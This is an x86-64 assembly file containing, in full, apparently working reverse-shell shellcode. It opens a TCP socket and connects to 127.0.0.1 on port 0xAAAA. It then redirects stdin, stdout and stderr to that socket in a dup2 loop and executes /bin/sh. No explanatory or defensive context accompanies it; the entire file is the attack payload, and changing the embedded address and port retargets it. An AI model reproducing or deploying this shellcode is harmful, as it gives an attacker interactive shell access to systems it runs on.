BITS 64



section .text

_start:
	xor rax, rax
	xor rbx, rbx
	cdq
	xor rdi, rdi
	xor rsi, rsi
	mov al, 41
	mov dil, 2
	mov sil, 1
	syscall
	xchg rdx, rax
	mov dword [rsp], 2
	mov word [rsp+2], 0xAAAA
	mov dword [rsp+4], 0x0100007f
	mov rsi, rsp
	mov dil, dl
	mov dl, 16
	mov al, 42
	syscall
	xor rsi, rsi
	mov sil, 3
.dup:
	dec rsi
	mov al, 33
	syscall
	jne .dup
	xor rdi, rdi
	mov sil, dil
	mov dl, dil
	mov rdi, 0x68732f6e69622f
; 	shr rdi, 8
	push rdi
	push rsp
	pop rdi
	mov al, 59
	syscall
	mov al, 60
	syscall
	
	
section .data
